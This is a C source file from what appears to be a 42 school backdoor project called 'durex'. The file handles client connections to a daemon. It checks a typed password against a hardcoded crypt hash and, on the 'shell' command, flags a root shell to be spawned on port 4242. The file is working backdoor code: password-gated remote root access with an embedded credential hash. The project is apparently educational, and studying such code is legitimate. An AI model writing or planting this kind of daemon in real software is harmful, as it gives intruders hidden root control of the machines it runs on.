/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   thread.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/06/05 10:27:26 by hivian            #+#    #+#             */
/*   Updated: 2017/06/12 16:06:38 by hivian           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

pthread_attr_t		thread_init()
{
	pthread_attr_t	thread_attr;

	if (pthread_attr_init(&thread_attr) != 0) {
		fprintf (stderr, "pthread_attr_init error");
		exit(EXIT_SUCCESS);
    }

	if (pthread_attr_setdetachstate(&thread_attr, PTHREAD_CREATE_DETACHED) != 0) {
		fprintf (stderr, "pthread_attr_setdetachstate error");
		exit(EXIT_SUCCESS);
    }
	return (thread_attr);
}

static void			loop(t_thread_params *c, char *buffer, int *ret, int sock,
char *ip, int port)
{
	char const		*pass = "A9ydQdSSfi/JY";
	char			salt[] = "A9";
	char			*message;
	char			str[256];
	bool			is_logged = false;

	while ((*ret = recv(sock, buffer, BUF_SIZE, 0)) > 0) {
		char *trim = strtrim(buffer);
		bzero(str, sizeof(str));
		if (!trim)
		{
			print_logs(c->logs, "Malloc error");
			continue ;
		}
		if (!is_logged) {
			if (!strcmp(crypt(trim, salt), pass)) {
				message = "[Daemon] Authentication success.\n";
				snprintf(str, sizeof(str), "[Client %s:%d] %s",
					ip, port, message);
				print_logs_n(c->logs, str);
				send(sock, message, strlen(message), 0);
				message = "[Daemon] Type \"shell\" to run the root shell.\n";
				send(sock, message, strlen(message), 0);
				is_logged = true;
			} else {
				message = "[Daemon] Authentication failed. Try again.\n";
				snprintf(str, sizeof(str), "[Client %s:%d] %s",
					ip, port, message);
				print_logs_n(c->logs, str);
				send(sock, message, strlen(message), 0);
			}
		} else {
			if (!strcmp(trim, "shell")) {
				pthread_mutex_lock(&lock);
				c->shell_on = true;
				pthread_mutex_unlock(&lock);
				message = "[Daemon] Spawning shell on port 4242.\n";
				send(sock, message, strlen(message), 0);
				strdel(&trim);
				*ret = 0;
				break;
			} else {
				message = "[Daemon] Not a valid command. Try again.\n";
				send(sock, message, strlen(message), 0);
			}
		}
		bzero(str, sizeof(str));
		bzero(buffer, BUF_SIZE);
		strdel(&trim);
	}
}

void				*thread_handler(void *context)
{
    int				ret;
    char			buffer[BUF_SIZE];
	char			str[256];
	t_thread_params	*c = (t_thread_params*)context;
	int sock = c->csock;
	char *ip = c->cli_ip;
	int port = c->cli_port;

	bzero(str, sizeof(str));
	bzero(buffer, sizeof(buffer));
	char *message = "Password: ";
    send(sock, message, strlen(message), 0);
	loop(c, buffer, &ret, sock, ip, port);
    if (ret == 0)
    {
		pthread_mutex_lock(&lock);
		c->total_connection--;
		pthread_mutex_unlock(&lock);
		snprintf(str, sizeof(str), "[Client %s:%d] disconnected.", ip, port);
		print_logs(c->logs, str);
    }
    else if (ret == -1) {
		snprintf(str, sizeof(str), "[Client %s:%d] Recv error.", ip, port);
		print_logs(c->logs, str);
	}
	pthread_mutex_lock(&lock);
	close(sock);
	pthread_mutex_unlock(&lock);
	return (NULL);
}
